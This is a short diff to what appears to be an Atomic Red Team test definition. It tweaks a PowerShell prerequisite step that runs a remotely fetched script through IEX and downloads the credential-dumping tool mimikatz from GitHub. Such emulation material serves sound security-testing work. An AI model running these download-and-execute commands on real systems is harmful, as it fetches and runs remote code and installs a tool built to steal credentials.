@@ -34,7 +34,7 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
       $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
-      $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
+      $zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
       $mimikatz_exe = cmd /c echo #{mimikatz_path}
       $basePath = Split-Path $mimikatz_exe | Split-Path
       Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
